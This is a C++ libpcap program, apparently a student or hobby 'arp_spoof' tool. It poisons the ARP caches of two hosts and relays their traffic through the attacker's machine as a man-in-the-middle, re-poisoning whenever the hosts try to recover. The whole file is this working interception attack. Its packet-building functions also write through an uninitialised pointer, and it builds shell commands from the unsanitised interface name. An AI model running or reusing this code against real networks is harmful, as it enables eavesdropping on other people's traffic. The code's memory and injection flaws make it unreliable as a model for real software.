#include <stdio.h>
#include <pcap.h>
#include <iostream>             //printByHexData()
#include <iomanip>              //printByHexData()
#include <netinet/ether.h>      //ether_aton_r()
#include <netinet/in.h>         //struct sockaddr_in
#include <arpa/inet.h>          //inet_aton()
#include <string.h>             //memcpy(),memcmp()
#include <arpa/inet.h>          //inet_aton()
#include <netinet/ip.h>         //ip header
#include <unistd.h>             //sleep()

using namespace std;

#pragma pack(push,1)
struct packet
{
    // ethernet header
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t type;

    // arp header
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint32_t sender_ip;
    uint8_t target_mac[6];
    uint32_t target_ip;
};
#pragma pack(pop)

#pragma pack(push,1)
struct arp_header
{
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint32_t sender_ip;
    uint8_t target_mac[6];
    uint32_t target_ip;
};
#pragma pack(pop)

uint8_t sender_mac[6];
uint8_t target_mac[6];

struct sockaddr_in sender_ip;
struct sockaddr_in target_ip;
struct sockaddr_in gateway;

struct ether_addr my_mac;
struct sockaddr_in my_ip;

struct ether_header *ethh;
struct ip *iph;

void find_me(char *dev_name);
void arp_request(pcap_t *handle, int check);
void arp_reply(pcap_t *handle, int check);

void printByHexData(u_int8_t *printArr, int length)
{

    for(int i=0;i<length;i++)
    {
        if(i%16==0)
            cout<<endl;
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i]<<" ";

    }

    cout<<dec<<endl;
    //printLine();
}


void usage()
{
    printf("=========================== Usage ===========================\n");
    printf("root@ubuntu~$ ./arp_spoof [interface] [sender ip] [target ip]");
}

int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if(handle == NULL)
    {
        fprintf(stderr, "Couldn't open device : %s : %s\n",dev, errbuf);
        return -1;
    }

    printf("device : %s\n",dev);

    //find my mac address && ip address
    find_me(dev);

    inet_aton(argv[2],&sender_ip.sin_addr);
    inet_aton(argv[3],&target_ip.sin_addr);

    //first! arp request
    printf("\n===================== arp request! =====================\n");
    printf("[arp request] : hacker -> sender\n");
    arp_request(handle,1);
    printf("[arp request] : hacker -> target\n");
    arp_request(handle,2);

    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char* get_packet;
        int res = pcap_next_ex(handle, &header, &get_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        ethh = (struct ether_header *)get_packet;
        if(ethh->ether_type == htons(0x0806) && memcmp(ethh->ether_dhost,my_mac.ether_addr_octet,6) == 0)
        {
            get_packet += sizeof(struct ether_header);
            struct arp_header *arph;
            arph = (struct arp_header *)get_packet;

            printf("This packet is <arp>\n");

                if(memcmp(&arph->sender_ip,&sender_ip.sin_addr,sizeof(uint32_t)) == 0
                        && memcmp(arph->target_mac,my_mac.ether_addr_octet,6) == 0
                        && memcmp(&arph->target_ip,&my_ip.sin_addr,sizeof(uint32_t)) == 0)
                {
                    memcpy(sender_mac,arph->sender_mac,6);
                    arp_reply(handle,1);
                }



            if(memcmp(&arph->sender_ip,&target_ip.sin_addr,sizeof(uint32_t)) == 0
                && memcmp(arph->target_mac,my_mac.ether_addr_octet,6) == 0
                && memcmp(&arph->target_ip,&my_ip.sin_addr,sizeof(uint32_t)) == 0)
            {
                memcpy(target_mac,arph->sender_mac,6);
                arp_reply(handle,2);
            }

        }

        // relay part
        if(ethh->ether_type == htons(0x0800))
        {
            get_packet += sizeof(struct ether_header);
            iph = (struct ip *)get_packet;

            printf("This packet is <ip>\n");
            if(memcmp(ethh->ether_dhost,my_mac.ether_addr_octet,6) == 0
                    && memcmp(ethh->ether_shost,sender_mac,6) == 0
                    && memcmp(&iph->ip_dst.s_addr,&my_ip.sin_addr,sizeof(uint32_t)) != 0)
            {
                get_packet -= sizeof(struct ether_header);
                memcpy((void *)get_packet,target_mac,6);
                memcpy((void *)get_packet+6,my_mac.ether_addr_octet,6);
                printf("[packet relay] : sender -> hacker -> target\n");
                pcap_sendpacket(handle,get_packet,header->caplen);
            }

            if(memcmp(ethh->ether_dhost,my_mac.ether_addr_octet,6) == 0
                    && memcmp(ethh->ether_shost,target_mac,6) == 0
                    && memcmp(&iph->ip_dst.s_addr,&target_ip.sin_addr,sizeof(uint32_t)) != 0)
            {
                get_packet -= sizeof(struct ether_header);
                memcpy((void*)get_packet,sender_mac,6);
                memcpy((void*)get_packet+6,my_mac.ether_addr_octet,6);
                printf("[packet relay] : target -> hacker -> sender\n");
                pcap_sendpacket(handle,get_packet,header->caplen);
            }
        }

        if(ethh->ether_type == htons(0x0806) && memcmp(ethh->ether_shost,sender_mac,6) == 0)
        {
            get_packet += sizeof(struct ether_header);
            struct arp_header *arph;
            arph = (struct arp_header *)get_packet;

            if(memcmp(arph->sender_mac,sender_mac,6) == 0)
            {
                printf("[recovery packet] : hacker -> sender\n");
                arp_reply(handle,1);
            }
        }

        if(ethh->ether_type == htons(0x0806) && memcmp(ethh->ether_shost,target_mac,6) == 0)
        {
            get_packet += sizeof(struct ether_header);
            struct arp_header *arph;
            arph = (struct arp_header *)get_packet;

            if(memcmp(arph->sender_mac,target_mac,6) == 0)
            {
                printf("[recovery packet] : hacker -> target\n");
                arp_reply(handle,2);
            }
        }
    }

    pcap_close(handle);

    return 0;
}

void find_me(char *dev_name)
{
    FILE *ptr;
    char MAC[20];
    char IP[21]={0,};
    char cmd[300]={0x0};

    //MY_MAC FIND
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);

    //MY_IP FIND
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    inet_aton(IP+5,&my_ip.sin_addr);
}

void arp_request(pcap_t *handle,int check)
{
    struct packet *p;
    memset(p->dst_mac,0xff,6);
    memcpy(p->src_mac,&my_mac.ether_addr_octet,6);

    p->type = htons(0x0806);
    p->hardware_type = htons(0x0001);
    p->protocol_type = htons(0x0800);
    p->hardware_size = 0x06;
    p->protocol_size = 0x04;
    p->opcode = htons(0x0001);  //arp request

    memcpy(p->sender_mac,&my_mac.ether_addr_octet,6);
    memcpy(&p->sender_ip,&my_ip.sin_addr,sizeof(uint32_t));
    memset(p->target_mac,0x00,6);

    if(check == 1)
        memcpy(&p->target_ip,&sender_ip.sin_addr,sizeof(uint32_t));

    if(check == 2)
        memcpy(&p->target_ip,&target_ip.sin_addr,sizeof(uint32_t));

    pcap_sendpacket(handle,(const u_char*)p,sizeof(struct packet));
}

void arp_reply(pcap_t *handle, int check)
{
    struct packet *p;

    if(check == 1)
    {
        printf("[arp reply] : hacker -> sender\n");
        memcpy(p->dst_mac,sender_mac,6);
        memcpy(p->src_mac,my_mac.ether_addr_octet,6);

        p->type = htons(0x0806);
        p->hardware_type = htons(0x0001);
        p->protocol_type = htons(0x0800);
        p->hardware_size = 0x06;
        p->protocol_size = 0x04;
        p->opcode = htons(0x0002);  //arp reply

        memcpy(p->sender_mac,my_mac.ether_addr_octet,6);
        memcpy(&p->sender_ip,&target_ip.sin_addr,sizeof(uint32_t));
        memcpy(p->target_mac,sender_mac,6);
        memcpy(&p->target_ip,&sender_ip.sin_addr,sizeof(uint32_t));

        pcap_sendpacket(handle,(const u_char*)p,sizeof(struct packet));
        sleep(1);
    }

    if(check == 2)
    {
        printf("[arp reply] : hacker -> target\n");
        memcpy(p->dst_mac,target_mac,6);
        memcpy(p->src_mac,my_mac.ether_addr_octet,6);

        p->type = htons(0x0806);
        p->hardware_type = htons(0x0001);
        p->protocol_type = htons(0x0800);
        p->hardware_size = 0x06;
        p->protocol_size = 0x04;
        p->opcode = htons(0x0002);  //arp reply

        memcpy(p->sender_mac,my_mac.ether_addr_octet,6);
        memcpy(&p->sender_ip,&sender_ip.sin_addr,sizeof(uint32_t));
        memcpy(p->target_mac,target_mac,6);
        memcpy(&p->target_ip,&target_ip.sin_addr,sizeof(uint32_t));

        pcap_sendpacket(handle,(const u_char*)p,sizeof(struct packet));
    }
}
